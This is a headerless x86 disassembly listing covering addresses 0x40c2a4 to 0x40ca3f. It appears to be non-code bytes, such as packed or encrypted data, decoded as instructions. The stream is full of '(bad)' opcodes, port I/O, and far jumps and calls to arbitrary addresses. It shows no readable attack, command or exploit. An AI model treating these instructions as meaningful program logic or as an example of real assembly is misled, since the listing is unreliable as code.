  40c2a4:	xor    BYTE PTR [ebp+0x5e],bh
  40c2a7:	int3   
  40c2a8:	lods   al,BYTE PTR ds:[esi]
  40c2a9:	iret   
  40c2aa:	rol    esp,cl
  40c2ac:	fist   WORD PTR [ecx+0x62603662]
  40c2b2:	xor    eax,0xa6552aca
  40c2b7:	mov    edi,DWORD PTR [esi-0x21]
  40c2ba:	mov    ebx,DWORD PTR [edi-0x47b42424]
  40c2c0:	dec    esi
  40c2c1:	sub    DWORD PTR [ebx-0x3c],0xaec0a660
  40c2c8:	mov    dl,0xae
  40c2ca:	xchg   BYTE PTR [edi],dl
  40c2cc:	rcl    DWORD PTR [ecx-0x701e6f53],1
  40c2d2:	xor    DWORD PTR [edi-0xd58ea1f],edi
  40c2d8:	out    0x32,al
  40c2da:	cld    
  40c2db:	outs   dx,DWORD PTR gs:[esi]
  40c2dd:	aaa    
  40c2de:	sbb    ecx,DWORD PTR [edx+0x4e]
  40c2e1:	scas   al,BYTE PTR es:[edi]
  40c2e2:	cmc    
  40c2e3:	jae    0x40c2ea
  40c2e5:	out    0xcc,al
  40c2e7:	sbb    ax,0x9838
  40c2eb:	jge    0x40c364
  40c2ed:	jno    0x40c2f6
  40c2ef:	cmp    al,0x92
  40c2f1:	outs   dx,DWORD PTR ds:[esi]
  40c2f2:	xchg   ecx,eax
  40c2f3:	jbe    0x40c2e5
  40c2f5:	xchg   esp,eax
  40c2f6:	cmpps  xmm1,XMMWORD PTR [ecx],0x7b
  40c2fa:	es loopne 0x40c376
  40c2fd:	and    al,0xd8
  40c2ff:	xchg   ecx,eax
  40c300:	or     ecx,esi
  40c302:	bound  eax,QWORD PTR [esi]
  40c304:	add    al,0x88
  40c306:	sub    edx,DWORD PTR [eax]
  40c308:	ss mov esi,0x46775fe2
  40c30e:	retf   0xe021
  40c311:	jno    0x40c2e6
  40c313:	mov    dh,0x40
  40c315:	aad    0x73
  40c317:	repz inc eax
  40c319:	(bad)  
  40c31a:	jge    0x40c32c
  40c31c:	js     0x40c30e
  40c31e:	jge    0x40c2d3
  40c320:	jmp    0x6e13:0xbc3c5c40
  40c327:	mov    edx,0x3e9c420c
  40c32c:	cs int 0xb7
  40c32f:	pop    esi
  40c330:	stc    
  40c331:	sub    esi,DWORD PTR [ebp+0x0]
  40c334:	pop    ds
  40c335:	das    
  40c336:	add    al,0x2b
  40c338:	je     0x40c351
  40c33a:	xchg   edi,eax
  40c33b:	xor    eax,0x254b291a
  40c340:	dec    edi
  40c341:	lods   al,BYTE PTR ds:[esi]
  40c342:	(bad)  
  40c343:	mov    al,ds:0xd28789cc
  40c348:	lds    edx,FWORD PTR [edi]
  40c34a:	sbb    al,BYTE PTR [esi-0x684fea7d]
  40c350:	mov    edi,0x5cd5ae2b
  40c355:	pop    ss
  40c356:	inc    esp
  40c357:	jne    0x40c382
  40c359:	cmp    ebp,DWORD PTR [edi]
  40c35b:	shr    DWORD PTR [edi],cl
  40c35d:	dec    ebx
  40c35e:	lds    esp,FWORD PTR [ebx-0x4e6b81f7]
  40c364:	pop    ecx
  40c365:	imul   ebx,ebx,0xfb53a178
  40c36b:	or     ch,bl
  40c36d:	lahf   
  40c36e:	ss (bad) 
  40c370:	out    0xeb,al
  40c372:	adc    DWORD PTR [edx],ebp
  40c374:	fsub   st,st(6)
  40c376:	(bad)  
  40c377:	add    dl,BYTE PTR [edi]
  40c379:	test   al,0x7c
  40c37b:	cld    
  40c37c:	(bad)  
  40c37d:	out    0x33,al
  40c37f:	retf   
  40c380:	add    DWORD PTR [eax-0x52],edi
  40c383:	adc    ecx,DWORD PTR [edi+0x21]
  40c386:	inc    esp
  40c387:	cmp    DWORD PTR [ecx+edi*8-0x1f],0x1b
  40c38c:	mov    ecx,0x7e6c8a04
  40c391:	stc    
  40c392:	mov    gs,edi
  40c394:	add    eax,0xc8776928
  40c399:	repz call 0x3b63:0xafce7f40
  40c3a1:	jmp    esp
  40c3a3:	push   cs
  40c3a4:	jo     0x40c418
  40c3a6:	jle    0x40c3b5
  40c3a8:	outs   dx,DWORD PTR es:[esi]
  40c3aa:	aam    0x94
  40c3ac:	dec    ebx
  40c3ad:	sub    dl,al
  40c3af:	sub    edi,DWORD PTR [ebx-0x1e]
  40c3b2:	js     0x40c40f
  40c3b4:	(bad)  
  40c3b5:	in     eax,0xbd
  40c3b7:	out    0x5f,eax
  40c3b9:	jmp    0x40c413
  40c3bb:	test   eax,0xe8802c5b
  40c3c0:	in     eax,0x3d
  40c3c2:	addr16 test eax,0xf1f08f93
  40c3c8:	push   ds
  40c3c9:	ss test eax,0xeae3cbc6
  40c3cf:	jbe    0x40c355
  40c3d1:	pop    eax
  40c3d2:	adc    esp,DWORD PTR [esi+0x73]
  40c3d5:	in     eax,0x1e
  40c3d7:	addr16 call 0x56a8:0xbe1b8ec6
  40c3df:	into   
  40c3e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3e1:	xchg   cl,dl
  40c3e3:	mov    cl,0xb2
  40c3e5:	fs sub cl,cl
  40c3e8:	cmp    DWORD PTR [esi],ebp
  40c3ea:	lea    esi,[edx+0x7cf84e10]
  40c3f0:	push   edx
  40c3f1:	cmp    ebp,0x45
  40c3f4:	outs   dx,DWORD PTR ds:[esi]
  40c3f5:	pop    ecx
  40c3f6:	inc    ebp
  40c3f7:	(bad)  
  40c3f8:	jbe    0x40c40b
  40c3fa:	repz push 0xff1644b9
  40c400:	push   esi
  40c401:	scas   eax,DWORD PTR es:[edi]
  40c402:	hlt    
  40c403:	in     al,dx
  40c404:	or     al,0xc9
  40c406:	push   edx
  40c407:	fidiv  DWORD PTR [ebp-0x64]
  40c40a:	jecxz  0x40c3f9
  40c40c:	or     eax,0xc42a1aa6
  40c411:	in     eax,0x11
  40c413:	xchg   edx,eax
  40c414:	push   edi
  40c415:	inc    esi
  40c416:	jmp    0x3210:0xa1745c4
  40c41d:	sub    al,0x7b
  40c41f:	(bad)  
  40c420:	call   0xd4d9:0xddfbfea9
  40c427:	push   edx
  40c428:	and    DWORD PTR [esp+ebp*1-0x45a9b69e],esi
  40c42f:	adc    al,0x75
  40c431:	jnp    0x40c47b
  40c433:	popaw  
  40c435:	pop    es
  40c436:	popa   
  40c437:	mov    ds:0x160c3d26,al
  40c43c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c43d:	pop    esp
  40c43e:	gs stc 
  40c440:	adc    eax,DWORD PTR [edx+0x61]
  40c443:	xlat   BYTE PTR ss:[ebx]
  40c445:	es sbb bh,bl
  40c448:	ss dec ecx
  40c44a:	xor    eax,DWORD PTR ds:0x64218fa8
  40c450:	push   eax
  40c451:	dec    edi
  40c452:	pop    edx
  40c453:	adc    al,0x7c
  40c455:	pop    ebp
  40c456:	dec    esp
  40c457:	mov    al,ds:0x64920134
  40c45c:	xor    BYTE PTR [edx],ch
  40c45e:	mov    eax,0xc92336a5
  40c463:	dec    ebp
  40c464:	lea    edi,[esi-0x2ac12961]
  40c46a:	xlat   BYTE PTR ds:[ebx]
  40c46b:	test   al,0xf3
  40c46d:	mov    edi,0x3121e9d2
  40c472:	stc    
  40c473:	sbb    eax,0x8fa8600e
  40c478:	xchg   ecx,eax
  40c479:	iret   
  40c47a:	repnz fidiv DWORD PTR ds:[ebx+0x26fea8c]
  40c482:	lahf   
  40c483:	mov    al,ds:0x4707b3f5
  40c488:	in     al,dx
  40c489:	pop    ebx
  40c48a:	stos   BYTE PTR es:[edi],al
  40c48b:	fs stc 
  40c48d:	shl    DWORD PTR [esi-0x7279396b],1
  40c493:	xor    dl,dh
  40c495:	(bad)  
  40c496:	fs in  eax,dx
  40c498:	pop    es
  40c499:	fistp  DWORD PTR [ebx]
  40c49b:	cmp    bh,BYTE PTR [eax+0x5]
  40c49e:	je     0x40c4d9
  40c4a0:	sub    DWORD PTR [edx-0x27],ebp
  40c4a3:	mov    ebx,0x4bc3cfdf
  40c4a8:	leave  
  40c4a9:	pop    ecx
  40c4aa:	daa    
  40c4ab:	jmp    0x27530c90
  40c4b0:	mov    ebp,0xced3c18c
  40c4b5:	inc    edi
  40c4b6:	xchg   edi,eax
  40c4b7:	lahf   
  40c4b8:	out    dx,eax
  40c4b9:	dec    edi
  40c4ba:	sub    eax,0x7c72c8cb
  40c4bf:	fdivr  st,st(4)
  40c4c1:	dec    esp
  40c4c2:	iret   
  40c4c3:	lds    esp,FWORD PTR [ecx-0x6e]
  40c4c6:	pop    ds
  40c4c7:	sbb    bl,BYTE PTR [ebp+0xc6efdad]
  40c4cd:	dec    edx
  40c4ce:	sub    ebx,esi
  40c4d0:	retf   
  40c4d1:	jmp    0x40c499
  40c4d3:	xor    BYTE PTR [edx+0x7d77ef8a],0xc4
  40c4da:	retf   
  40c4db:	jbe    0x40c496
  40c4dd:	or     ebp,esi
  40c4df:	sbb    BYTE PTR [eax-0x3d63a1f6],dh
  40c4e5:	imul   ebx,edx,0x1377ae09
  40c4eb:	and    DWORD PTR [eax-0x1a],ebx
  40c4ee:	ficomp DWORD PTR [eax]
  40c4f1:	gs adc eax,0x450dac83
  40c4f7:	ret    0x85d3
  40c4fa:	sbb    ecx,DWORD PTR [esi+0x42413649]
  40c500:	mov    bh,ch
  40c502:	inc    ebx
  40c503:	loope  0x40c495
  40c505:	imul   sp,WORD PTR ds:0x75b28999,0x31
  40c50d:	pop    edi
  40c50e:	cmp    al,0xb3
  40c510:	push   ds
  40c511:	cld    
  40c512:	cs inc esi
  40c514:	ds or  cl,dh
  40c517:	sbb    BYTE PTR [ebx+0x478bf31f],dl
  40c51d:	lahf   
  40c51e:	xor    ecx,DWORD PTR [ebx-0x63cc20a1]
  40c524:	dec    esi
  40c525:	mov    dh,0xa6
  40c527:	add    DWORD PTR ds:0xeb351cd2,ebx
  40c52d:	ins    BYTE PTR es:[edi],dx
  40c52e:	push   es
  40c52f:	mov    al,ds:0xfba0555d
  40c534:	(bad)  
  40c535:	in     al,dx
  40c536:	mov    eax,ds:0xf0d223ad
  40c53b:	xchg   dh,bl
  40c53d:	or     DWORD PTR es:[esi+ecx*2-0x39],edx
  40c542:	mul    DWORD PTR [edx+eiz*4+0x2c92a5bc]
  40c549:	pop    ecx
  40c54a:	inc    ebx
  40c54b:	scas   al,BYTE PTR es:[edi]
  40c54c:	fsub   st(2),st
  40c54e:	push   ds
  40c54f:	jge    0x40c55c
  40c551:	push   ss
  40c552:	mov    fs,WORD PTR ds:0x5d6acfbb
  40c558:	rol    BYTE PTR [ebp+0x3af1b87e],0xcc
  40c55f:	pop    ds
  40c560:	push   0xffffff95
  40c562:	es inc ecx
  40c564:	sbb    bl,al
  40c566:	je     0x40c52b
  40c568:	jl     0x40c550
  40c56a:	inc    ebx
  40c56b:	mov    ah,0xb8
  40c56d:	fisub  DWORD PTR [esi]
  40c56f:	dec    esi
  40c570:	pop    edi
  40c571:	xchg   ebx,eax
  40c572:	or     BYTE PTR fs:[ebx+0x4d],0x57
  40c577:	(bad)  
  40c579:	cmp    al,0xec
  40c57b:	dec    edx
  40c57c:	mov    edx,0x15644711
  40c581:	ins    BYTE PTR es:[edi],dx
  40c582:	(bad)  
  40c584:	das    
  40c585:	js     0x40c51f
  40c587:	je     0x40c529
  40c589:	push   0x7
  40c58b:	rol    bh,0xae
  40c58e:	js     0x40c589
  40c590:	jecxz  0x40c5b4
  40c592:	(bad)  
  40c593:	out    0xaf,eax
  40c595:	(bad)  
  40c596:	sti    
  40c597:	adc    eax,ecx
  40c599:	mov    gs,edx
  40c59b:	sub    BYTE PTR [esi+0x6e],bl
  40c59e:	sub    ebx,ebp
  40c5a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5a2:	push   esi
  40c5a3:	ret    0xe3db
  40c5a6:	das    
  40c5a7:	out    0xba,al
  40c5a9:	out    dx,al
  40c5aa:	push   cs
  40c5ab:	(bad)
  40c5ae:	or     ebp,esi
  40c5b0:	jnp    0x40c57a
  40c5b2:	mov    esi,0x61542800
  40c5b7:	lahf   
  40c5b8:	push   eax
  40c5b9:	add    WORD PTR ds:0x8ced7ab8,cx
  40c5c0:	cld    
  40c5c1:	mulps  xmm1,XMMWORD PTR [esi]
  40c5c4:	adc    eax,DWORD PTR [edx-0x32]
  40c5c7:	jmp    0x40c5a6
  40c5c9:	xor    eax,0x156ed7be
  40c5ce:	sti    
  40c5cf:	jge    0x40c629
  40c5d1:	dec    ecx
  40c5d2:	aad    0x1e
  40c5d4:	in     al,0xd7
  40c5d6:	fidivr WORD PTR [edi-0x6660a484]
  40c5dc:	pop    ebp
  40c5dd:	dec    edi
  40c5de:	fild   WORD PTR [ebx-0xb]
  40c5e1:	call   0x3969:0xbb2311de
  40c5e8:	add    ecx,DWORD PTR [edx-0x7c]
  40c5eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5ec:	and    DWORD PTR [edx+0x19],eax
  40c5ef:	add    al,0x9b
  40c5f1:	aas    
  40c5f2:	jp     0x40c584
  40c5f4:	ss std 
  40c5f6:	mov    ebx,0xe508220e
  40c5fb:	add    BYTE PTR [ebx-0x1e],0xbb
  40c5ff:	mov    esi,ebx
  40c601:	dec    ecx
  40c602:	mov    edi,0xb5355d73
  40c607:	int    0x1e
  40c609:	or     eax,0x6ea6865
  40c60e:	jmp    0x40c5b8
  40c610:	add    eax,DWORD PTR [edi+0x30]
  40c613:	pop    esi
  40c614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c615:	repz test bh,0x60
  40c619:	test   al,0x2a
  40c61b:	push   esp
  40c61c:	inc    ebp
  40c61d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c61e:	cmc    
  40c61f:	xor    al,0xbf
  40c621:	add    eax,0x199a581
  40c626:	popf   
  40c627:	sbb    ch,bl
  40c629:	and    dh,BYTE PTR [edx-0x3a]
  40c62c:	jo     0x40c640
  40c62e:	push   es
  40c62f:	jb     0x40c5fa
  40c631:	ins    DWORD PTR es:[edi],dx
  40c632:	jnp    0x40c625
  40c634:	fdiv   DWORD PTR [ecx+0x30]
  40c637:	jmp    0xe0c9:0xae1a031c
  40c63e:	jae    0x40c650
  40c640:	adc    al,0x80
  40c642:	cld    
  40c643:	sbb    ah,BYTE PTR ds:0xdb66688b
  40c649:	fs mov bl,0x79
  40c64c:	(bad)  
  40c64d:	retf   0x6910
  40c650:	mov    ds:0x682f973e,al
  40c655:	jg     0x40c649
  40c657:	sbb    DWORD PTR [ebp+ebx*4+0x2cd831fd],0xd9cf983b
  40c662:	out    dx,eax
  40c663:	neg    bh
  40c665:	mov    ebp,0xccb6dd64
  40c66a:	adc    al,al
  40c66c:	push   0x51515fee
  40c671:	scas   al,BYTE PTR es:[edi]
  40c672:	shr    DWORD PTR [eax+0x1a626279],cl
  40c678:	adc    eax,0x1ac3fb77
  40c67d:	fcomp  DWORD PTR [edx+0xbff2b9d]
  40c683:	xchg   ecx,eax
  40c684:	cwde   
  40c685:	sub    ch,BYTE PTR [ecx+esi*2-0x26]
  40c689:	or     DWORD PTR [edx-0x72],eax
  40c68c:	adc    BYTE PTR [ebp+ecx*4+0xe],0xe3
  40c691:	mov    edx,0xb7928e8a
  40c696:	mov    cs:0x6a526701,al
  40c69c:	fstp   DWORD PTR [ebx-0x9]
  40c69f:	mov    ?,WORD PTR ds:[ebx+0x67]
  40c6a3:	rcl    BYTE PTR [esi],1
  40c6a5:	sbb    edx,0xed713417
  40c6ab:	adc    esi,DWORD PTR [edx+0x774ed2a8]
  40c6b1:	sub    eax,0xafe5f466
  40c6b6:	sbb    edx,DWORD PTR [edx+0x46]
  40c6b9:	arpl   ax,si
  40c6bb:	(bad)  
  40c6bc:	sbb    DWORD PTR [ecx-0x12],ebp
  40c6bf:	sbb    bh,BYTE PTR [esi-0x7a]
  40c6c2:	push   edx
  40c6c3:	sub    eax,0x8fe04b72
  40c6c8:	out    dx,eax
  40c6c9:	pop    ebp
  40c6ca:	dec    edi
  40c6cb:	fcom   st(3)
  40c6cd:	lods   eax,DWORD PTR ds:[esi]
  40c6ce:	push   esi
  40c6cf:	push   ds
  40c6d0:	pop    esi
  40c6d1:	aas    
  40c6d2:	iret   
  40c6d3:	mov    ch,0x96
  40c6d5:	fwait
  40c6d6:	or     eax,0xb4029584
  40c6db:	xor    ah,BYTE PTR [ebp+0x2d]
  40c6de:	sbb    BYTE PTR [ebx+ebx*1+0x75345023],cl
  40c6e5:	or     DWORD PTR [edx],esp
  40c6e7:	cmp    edi,DWORD PTR [edi-0x4a]
  40c6ea:	inc    esi
  40c6eb:	mov    edi,0x25018ed3
  40c6f0:	adc    cl,BYTE PTR [edi+0x14557aaa]
  40c6f6:	dec    edx
  40c6f7:	icebp  
  40c6f8:	mov    eax,ds:0x37a585f8
  40c6fd:	dec    esp
  40c6fe:	cmp    esi,ecx
  40c700:	in     al,0xa2
  40c702:	clc    
  40c703:	test   eax,0x5b034318
  40c708:	retf   0x4089
  40c70b:	push   ebp
  40c70c:	in     eax,0x98
  40c70e:	out    dx,eax
  40c70f:	test   al,0x62
  40c711:	sbb    DWORD PTR ds:0x4f2e6867,ecx
  40c717:	or     DWORD PTR [edx+0x4abb6cc0],ebp
  40c71d:	jae    0x40c6bc
  40c71f:	(bad)  
  40c720:	mov    ah,0x94
  40c722:	push   esi
  40c723:	pop    esp
  40c724:	adc    DWORD PTR [ebx],ecx
  40c726:	sub    BYTE PTR [edi-0x7a06a5ba],al
  40c72c:	imul   ebp,DWORD PTR [edx],0x38
  40c72f:	clc    
  40c730:	bound  eax,QWORD PTR [edi-0x36]
  40c733:	fs dec ebx
  40c735:	xchg   esp,eax
  40c736:	pop    es
  40c737:	int    0xdc
  40c739:	test   al,0xd
  40c73b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c73c:	add    DWORD PTR ds:0x1271db92,edi
  40c742:	fsubr  QWORD PTR [ecx-0x31]
  40c745:	test   BYTE PTR [edi+0x67],cl
  40c748:	mov    ch,0xdc
  40c74a:	jmp    0xecc7aba0
  40c74f:	enter  0xf0da,0xb
  40c753:	sbb    al,0xa2
  40c755:	mul    BYTE PTR [ebp+0x704c9c74]
  40c75b:	sub    cl,BYTE PTR [edx+0x5]
  40c75e:	mov    edi,0x4090a6e1
  40c763:	xchg   ecx,eax
  40c764:	icebp  
  40c765:	pop    ecx
  40c766:	adc    DWORD PTR ds:0xd54e138a,edx
  40c76c:	sub    al,0x93
  40c76e:	call   0x56af282e
  40c773:	ror    BYTE PTR [ebp-0x29],0x1d
  40c777:	cmp    BYTE PTR [ecx-0x24],dl
  40c77a:	fld    QWORD PTR [eax+edx*2-0x37]
  40c77e:	sbb    BYTE PTR [edx-0x33],ah
  40c781:	sbb    bl,BYTE PTR [esi-0x7b069ed2]
  40c787:	and    eax,0x9ad3cad7
  40c78c:	mov    al,ds:0x4ef0e1b5
  40c791:	jb     0x40c7b2
  40c793:	xor    al,ch
  40c795:	add    al,0xf7
  40c797:	fdiv   st,st(1)
  40c799:	ins    DWORD PTR es:[edi],dx
  40c79a:	out    dx,al
  40c79b:	cmp    edx,ebp
  40c79d:	test   esi,ebp
  40c79f:	push   ebx
  40c7a0:	loope  0x40c73b
  40c7a2:	sbb    BYTE PTR [edi+0x6c45c5c2],cl
  40c7a8:	mov    al,ds:0xd3c382b3
  40c7ad:	push   0x2
  40c7af:	sar    DWORD PTR [ebp-0x1f],cl
  40c7b2:	ins    BYTE PTR es:[edi],dx
  40c7b3:	shr    DWORD PTR [esp+ecx*1],1
  40c7b6:	mov    eax,0x7f259d00
  40c7bb:	jle    0x40c831
  40c7bd:	inc    ecx
  40c7be:	test   DWORD PTR [edx+eax*2],ebp
  40c7c1:	js     0x40c7a8
  40c7c3:	or     eax,eax
  40c7c5:	pop    edi
  40c7c6:	push   cs
  40c7c7:	push   0xfc383424
  40c7cc:	push   0xa69b4833
  40c7d1:	mov    edx,0x632d9403
  40c7d6:	jo     0x40c76a
  40c7d8:	icebp  
  40c7d9:	stc    
  40c7da:	inc    esi
  40c7db:	push   0xaf3a5fc9
  40c7e0:	or     BYTE PTR [edi-0x80],dh
  40c7e3:	adc    BYTE PTR [ebx],bl
  40c7e5:	jns    0x40c80f
  40c7e7:	xchg   ebx,eax
  40c7e8:	call   0x2dbf:0x5cb1bfcd
  40c7ef:	pop    esi
  40c7f0:	clc    
  40c7f1:	mov    di,cx
  40c7f4:	sbb    bl,ah
  40c7f6:	jl     0x44e9aff4
  40c7fc:	aam    0x2f
  40c7fe:	or     BYTE PTR [edi-0xe5676c0],al
  40c804:	adc    al,0xe7
  40c806:	ret    0x104
  40c809:	lds    esp,FWORD PTR [edx]
  40c80b:	in     eax,0x92
  40c80d:	lahf   
  40c80e:	push   esp
  40c80f:	int3   
  40c810:	jecxz  0x40c7b3
  40c812:	xor    BYTE PTR [eax+0x2f],ah
  40c815:	adc    cl,BYTE PTR [ecx]
  40c817:	pop    edi
  40c818:	fcomi  st,st(4)
  40c81a:	dec    ecx
  40c81b:	mov    edx,0x152ff3f4
  40c820:	or     eax,0x929f6903
  40c825:	bound  esp,QWORD PTR [esi-0x3d327dd0]
  40c82b:	jmp    0x56c61986
  40c830:	fsqrt  
  40c832:	adc    al,0xac
  40c834:	add    dh,ch
  40c836:	pushf  
  40c837:	and    BYTE PTR [esi-0x585fd258],0x66
  40c83e:	int    0x93
  40c840:	or     cl,BYTE PTR [edx]
  40c842:	nop
  40c843:	adc    BYTE PTR [esi],dh
  40c845:	jg     0x40c849
  40c847:	rol    DWORD PTR [ebp+0x58],1
  40c84a:	xchg   edi,eax
  40c84b:	jne    0x40c7d9
  40c84d:	push   edi
  40c84e:	pop    es
  40c84f:	add    BYTE PTR [ebp+0xa1de7a9],dl
  40c855:	ss out 0x4a,al
  40c858:	pop    ss
  40c859:	mov    ecx,0xcb28cda5
  40c85e:	adc    al,0x55
  40c860:	scas   eax,DWORD PTR es:[edi]
  40c861:	and    DWORD PTR [ecx],edi
  40c863:	in     al,0xa7
  40c865:	xor    al,0xe5
  40c867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c868:	mov    ebp,DWORD PTR [edi-0x73]
  40c86b:	fst    st(6)
  40c86d:	push   ds
  40c86e:	lahf   
  40c86f:	mov    edx,0x79cd58dc
  40c874:	xchg   BYTE PTR gs:[ebp+0x30f3d6cd],dh
  40c87b:	pop    es
  40c87c:	aas    
  40c87d:	lock mov esp,0x5e4023bc
  40c883:	dec    ebx
  40c884:	mov    ds:0x5d03af51,al
  40c889:	pop    ss
  40c88a:	in     eax,dx
  40c88b:	or     BYTE PTR [ebx+0x2cdd4a94],dh
  40c891:	xchg   BYTE PTR [ecx],bl
  40c893:	aam    0x93
  40c895:	mov    bl,0xf
  40c897:	(bad)  
  40c898:	shl    BYTE PTR [edx],1
  40c89a:	call   0x390cc259
  40c89f:	hlt    
  40c8a0:	ret    
  40c8a1:	lds    edx,FWORD PTR [esi-0x2e]
  40c8a4:	add    ebp,ecx
  40c8a6:	retf   0xe228
  40c8a9:	popa   
  40c8aa:	cmp    bh,BYTE PTR [eax+edx*8-0x296e9c34]
  40c8b1:	jo     0x40c837
  40c8b3:	and    BYTE PTR [ecx+eiz*4+0x229f6928],bh
  40c8ba:	mov    ?,WORD PTR [edx]
  40c8bc:	inc    esi
  40c8bd:	das    
  40c8be:	frstpm(287 only) 
  40c8c0:	mov    eax,0xd83f29da
  40c8c5:	mov    edi,0xca48ab90
  40c8ca:	in     al,0x8f
  40c8cc:	in     eax,0x2
  40c8ce:	dec    ecx
  40c8cf:	dec    esp
  40c8d0:	fist   DWORD PTR [ebx]
  40c8d2:	outs   dx,DWORD PTR ds:[esi]
  40c8d3:	adc    eax,0xf7dfcf28
  40c8d8:	dec    ecx
  40c8d9:	jne    0x40c8d7
  40c8db:	push   esi
  40c8dc:	aad    0xad
  40c8de:	popf   
  40c8df:	cmp    bh,BYTE PTR [eax]
  40c8e1:	xor    dl,BYTE PTR ds:0x2e07d77a
  40c8e7:	(bad)  
  40c8e8:	enter  0xc638,0xc9
  40c8ec:	adc    BYTE PTR [ecx],al
  40c8ee:	icebp  
  40c8ef:	pop    eax
  40c8f1:	cmp    al,0x1
  40c8f3:	(bad)  
  40c8f4:	enter  0xc419,0x9
  40c8f8:	jne    0x40c954
  40c8fa:	stos   BYTE PTR es:[edi],al
  40c8fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8fc:	add    DWORD PTR [edx+0x2a641936],0xffffffa8
  40c903:	ja     0xe7112c86
  40c909:	sbb    DWORD PTR [esi],esp
  40c90b:	inc    ebx
  40c90c:	or     BYTE PTR ss:[ebx+0x1a7c366a],ah
  40c913:	imul   ecx,edi,0xffffffd1
  40c916:	xor    eax,0x2436e86c
  40c91b:	cdq    
  40c91c:	out    dx,eax
  40c91d:	sahf   
  40c91e:	pop    cx
  40c920:	or     DWORD PTR [eax],0xffffff8a
  40c923:	mov    eax,0xa0c60f43
  40c928:	mov    al,0xc2
  40c92a:	sub    ebx,DWORD PTR [ebx+0x4c11bdc4]
  40c930:	sbb    dl,BYTE PTR [esi+0x3d]
  40c933:	std    
  40c934:	retf   
  40c935:	sub    eax,0xeb5f655e
  40c93a:	pop    ebp
  40c93b:	xor    ebp,DWORD PTR [ebx+0x56c78b0]
  40c941:	adc    al,0xcb
  40c943:	sahf   
  40c944:	(bad)  
  40c945:	andnps xmm3,xmm5
  40c948:	into   
  40c949:	mov    eax,0xdcd5de74
  40c94e:	jmp    0xa7d9ea3
  40c953:	mov    ch,0x5f
  40c955:	popa   
  40c956:	sbb    esi,ebx
  40c958:	ins    DWORD PTR es:[edi],dx
  40c959:	mov    esi,0xe32d9a6a
  40c95e:	cmp    BYTE PTR [esi+0x19],dl
  40c961:	jne    0x40c98d
  40c963:	loop   0x40c9b2
  40c965:	shr    ah,0xbe
  40c968:	popf   
  40c969:	sub    edi,0xffffff9b
  40c96c:	rol    cl,0x56
  40c96f:	push   esi
  40c970:	sbb    DWORD PTR [ecx+0x55d9b7ec],ebp
  40c976:	cli    
  40c977:	scas   al,BYTE PTR es:[edi]
  40c978:	jne    0x40c9f7
  40c97a:	stos   BYTE PTR es:[edi],al
  40c97b:	jecxz  0x40c943
  40c97d:	mov    ?,WORD PTR [ebp+0x7db99cf0]
  40c983:	pop    ss
  40c984:	jecxz  0x40c912
  40c986:	push   esi
  40c987:	jle    0x40c9f1
  40c989:	in     eax,0xd7
  40c98b:	jb     0x40c926
  40c98d:	loope  0x40c98c
  40c98f:	nop
  40c990:	aam    0xb9
  40c992:	and    al,0x80
  40c994:	jb     0x40c99d
  40c996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c997:	jle    0x40c9d5
  40c999:	xchg   esi,eax
  40c99a:	loope  0x40c9d3
  40c99c:	test   esi,esi
  40c99e:	sbb    eax,DWORD PTR [esi+ebx*8+0x12]
  40c9a2:	lds    ebx,FWORD PTR [eax]
  40c9a4:	dec    edi
  40c9a5:	scas   eax,DWORD PTR es:[edi]
  40c9a6:	adc    eax,edx
  40c9a8:	jecxz  0x40c938
  40c9aa:	pop    edx
  40c9ab:	cmp    al,0xfb
  40c9ad:	(bad)  
  40c9ae:	xor    ebx,DWORD PTR [ebp-0x2f4a099a]
  40c9b4:	xchg   ecx,eax
  40c9b5:	shr    ch,1
  40c9b7:	mov    ebp,0x6a160635
  40c9bc:	lds    esi,FWORD PTR [edx-0x36]
  40c9bf:	scas   eax,DWORD PTR es:[edi]
  40c9c0:	fnstsw WORD PTR [edi+0x139a88f2]
  40c9c6:	jno    0x40ca10
  40c9c8:	pop    ds
  40c9c9:	add    al,0x12
  40c9cb:	icebp  
  40c9cc:	push   edi
  40c9cd:	jl     0x40c9ba
  40c9cf:	xor    dl,cl
  40c9d1:	add    al,0x28
  40c9d3:	adc    al,0x44
  40c9d5:	scas   al,BYTE PTR es:[edi]
  40c9d6:	je     0x40c9a1
  40c9d8:	sbb    eax,0xfd44d597
  40c9dd:	adc    al,0xe5
  40c9df:	push   edi
  40c9e0:	loopne 0x40c9be
  40c9e2:	fld    TBYTE PTR [edx-0x4166e19f]
  40c9e8:	push   ebx
  40c9e9:	jnp    0x40ca6a
  40c9eb:	cli    
  40c9ec:	shl    edi,1
  40c9ee:	mov    eax,ds:0x5a0f202e
  40c9f3:	rcr    cl,cl
  40c9f5:	fimul  DWORD PTR [ebp+0x32]
  40c9f8:	jbe    0x40c9bf
  40c9fa:	pop    eax
  40c9fb:	dec    ebp
  40c9fc:	or     esp,DWORD PTR [ebp-0x7f]
  40c9ff:	call   0xd883cb68
  40ca04:	mov    ecx,0xd9010f50
  40ca09:	inc    ecx
  40ca0a:	xchg   ebp,eax
  40ca0b:	push   cs
  40ca0c:	lods   al,BYTE PTR ds:[esi]
  40ca0d:	(bad)  
  40ca0e:	mov    eax,DWORD PTR [ebx-0x37e9e509]
  40ca14:	mov    dh,0xaf
  40ca16:	cs mov ecx,0xffbbc7b6
  40ca1c:	fidivr DWORD PTR [edx+0x38]
  40ca1f:	std    
  40ca20:	iret   
  40ca21:	adc    BYTE PTR [ebp-0x41],ch
  40ca24:	stos   BYTE PTR es:[edi],al
  40ca25:	mov    ebp,cs
  40ca27:	aam    0x9e
  40ca29:	adc    cl,ch
  40ca2b:	icebp  
  40ca2c:	xor    al,0xc0
  40ca2e:	fwait
  40ca2f:	mov    edx,0xdbfb451d
  40ca34:	js     0x40c9fa
  40ca36:	fidivr DWORD PTR [ebp-0x71]
  40ca39:	and    eax,0xf1a10284
  40ca3e:	dec    esi
  40ca3f:	or     BYTE PTR [edx+0x6a083b45],0x4a
